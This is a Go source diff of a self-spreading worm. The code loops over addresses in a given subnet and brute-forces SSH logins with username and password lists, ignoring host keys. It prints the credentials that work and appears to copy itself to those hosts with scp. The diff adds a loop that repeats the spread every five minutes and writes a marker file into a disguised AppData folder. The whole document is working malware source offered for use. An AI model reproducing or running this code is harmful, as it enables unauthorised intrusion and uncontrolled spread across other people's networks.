@@ -1,25 +1,25 @@
 package main
 
 import (
+	"runtime"
+	"os"
+	"io/ioutil"
+	"strconv"
+	"log"
+)
+
+//Put in target subnet in the form 10.2.3.
+import (
 		"golang.org/x/crypto/ssh"
 		"fmt"
 		"time"
 		"strings"
-		"os"
-		"log"
 		"bufio"
-		"strconv"
-		"runtime"
 		"sync"
-
-	"github.com/tmc/scp"
-	//"net/http"
-	"net"
-	"io/ioutil"
+		"github.com/tmc/scp"
 )
 func main(){
 	myos := runtime.GOOS
-	startwormingboi(myos)
 	if myos=="windows" {
 		if _, err := os.Stat("\\Users\\%USERNAME%\\AppData\\Roaming\\Inconspicuous_Folder\\flag.txt"); os.IsNotExist(err) {
 			ioutil.WriteFile("\\Users\\%USERNAME%\\AppData\\Roaming\\Inconspicuous_Folder\\flag.txt",[]byte("hello"),0644)
@@ -33,13 +33,18 @@ func main(){
 			os.Exit(3)
 		}
 	}
+	sum := 1
+	for sum  == 1 {
+		startwormingboi(myos)
+		time.Sleep(5 * time.Minute)
+	}
 }
 
 func startwormingboi(myos string) {
 
 	var user = readinfile("user.txt")
 	var passwds = readinfile("passwds.txt")
-	var subnets = readinfile("subnets.txt")
+	var subnets = os.Args[1]
 	var step = readinfile("step.txt")
 
 	start, err := strconv.ParseInt(step[0], 10, 64)
@@ -56,16 +61,13 @@ func startwormingboi(myos string) {
 	}
 	var myip = ""
 	var wg sync.WaitGroup
-	for i := 0; i < len(subnets); i++ {
 		for l := start; l <= stop; l=l+stepval{
-			myip = joinstrings(subnets[i],strconv.Itoa(int(l)))
+			myip = joinstrings(subnets,strconv.Itoa(int(l)))
 				wg.Add(1)
 				go gettingin(myip, user, passwds, &wg)
 
 			}
 			wg.Wait()
-		}
-		wg.Wait()
 	 } 
 
 func gettingin(myip string, user []string, passwds []string, wg *sync.WaitGroup ){
@@ -75,7 +77,7 @@ func gettingin(myip string, user []string, passwds []string, wg *sync.WaitGroup 
 	for j := 0; j < len(user); j++ {
 		for k := 0; k < len(passwds); k++ {
 			if !(iswin) {
-				n = len(getinlinux(myip, user[j], passwds[k]))
+				n = len(getinssh(myip, user[j], passwds[k]))
 			}
 			if n == 3 {
 				fmt.Printf("\n ssh works for %s with user:%s and pass:%s", myip,user[j],passwds[k] )
@@ -118,7 +120,7 @@ func gettingin(myip string, user []string, passwds []string, wg *sync.WaitGroup 
 	defer wg.Done()
 }
 
-func getinlinux(myip string, user string, passwd string) (myreturn string) {
+func getinssh(myip string, user string, passwd string) (myreturn string) {
 	sshConfig := &ssh.ClientConfig{
 		User:            user,
 		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
@@ -208,15 +210,4 @@ func readinfile(myfile string) (readinarr []string){
         log.Fatal(err)
     }
     return
-}
-func GetOutboundIP() net.IP {
-	conn, err := net.Dial("udp", "8.8.8.8:80")
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer conn.Close()
-
-	localAddr := conn.LocalAddr().(*net.UDPAddr)
-
-	return localAddr.IP
 }
